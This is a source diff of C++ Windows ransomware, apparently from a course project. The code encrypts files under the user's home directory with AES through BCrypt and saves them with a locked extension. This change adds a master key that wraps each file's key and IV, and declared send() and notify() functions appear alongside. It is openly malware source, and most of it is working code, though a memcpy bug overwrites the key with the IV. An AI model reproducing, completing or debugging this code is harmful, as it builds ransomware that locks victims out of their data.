@@ -4,14 +4,13 @@
 using namespace boost::filesystem;
 using std::string;
 
-void encrypt(string path);
-
+void encrypt(string path, const PBYTE masterIV, const PBYTE masterKey);
 
 string get_username();
 string get_home();
 void send();
 void notify();
-
+DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
 
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
@@ -19,14 +18,15 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
 
 int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
-
+	PBYTE masterIV, masterKey;
+	DWORD status = generateKeyAndIV(&masterIV, &masterKey);
 #ifdef DEBUG
 	string path = "C:\\Programming\\RansomWare\\236499\\test\\rans.txt";
 #else
 	string path = get_home();
 #endif
 
-	encrypt(path);
+	encrypt(path, masterIV, masterKey);
 //	iterate(path);
 
 //#ifdef DEBUG
@@ -43,11 +43,27 @@ int main(int argc, char* argv[]) {
 	return 0;
 }
 
-void encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
+DWORD encryptKeyIV(PBYTE keyIV, PBYTE *buff, const PBYTE masterKey, const PBYTE masterIV)
 {
 	DWORD status;
-	
-	
+	BCRYPT_ALG_HANDLE aesHandle = nullptr;
+	BCRYPT_KEY_HANDLE keyHandle;
+	status = getKeyHandle(masterKey, keyHandle, aesHandle);
+	if (!NT_SUCCESS(status)) {
+		//TODO cleanup
+	}
+	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	if (NULL == tmpIv) {
+		//cleanup
+	}
+	memcpy(tmpIv, masterIV, IV_LEN);
+	DWORD  resSize;
+
+	status = BCryptEncrypt(keyHandle, keyIV, KEY_LEN + IV_LEN, NULL, tmpIv, IV_LEN, *buff, KEY_LEN + IV_LEN, &resSize, BCRYPT_PAD_NONE);
+	if (!NT_SUCCESS(status)) {
+		//TODO cleanup
+	}
+	return status;
 }
 
 DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
@@ -78,15 +94,14 @@ void initPlainText(string path, PBYTE *buffer, size_t buffSize)
 	plaintextFile.close();
 }
 
-void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE iv, PBYTE key, size_t plainTextSize)
+void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, size_t plainTextSize)
 {
 	unsigned short paddingSize = IV_LEN - (plainTextSize % IV_LEN);
 	char paddingSizeCStr[IV_DIGITS_NUM + 1] = { 0 }; //TODO 2 is the number of digits in IV_LEN, might wanna change that programatically
 	snprintf(paddingSizeCStr, IV_DIGITS_NUM + 1, "%02d", paddingSize);
 	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
 	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
-	ofile.write((char*)iv, IV_LEN);
-	ofile.write((char*)key, KEY_LEN);
+	ofile.write((char*)keyIV, KEY_LEN + IV_LEN);
 	ofile.write((char*)cipherText, cipherLen);
 	ofile.close();
 }
@@ -119,7 +134,7 @@ DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& a
 	return status;
 }
 
-void encrypt(string path) 
+void encrypt(string path,  const PBYTE masterIV, const PBYTE masterKey)
 {
 	DWORD status;
 	PBYTE plainText = NULL;
@@ -174,7 +189,23 @@ void encrypt(string path)
 #ifdef DEBUG
 	std::cout << "Ciphertext:\t" << cipherText << std::endl;
 #endif
-	writeToFile(path, cipherText, cipherSize, iv, key, plainTextLen);
+	PBYTE keyIVBuff = nullptr;
+	PBYTE keyIV = nullptr;
+	keyIVBuff = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
+	if(keyIVBuff == nullptr)
+	{
+		//TODO cleanup
+	}
+	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
+	if (keyIV == nullptr)
+	{
+		//TODO cleanup
+	}
+	memcpy(keyIV,key,KEY_LEN);
+	memcpy(keyIV, iv, IV_LEN);
+	
+	status = encryptKeyIV(keyIV, &keyIVBuff, masterKey, masterIV);
+	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
 	
 	//TODO CLEANUP!!!!!
 	delete plainText;
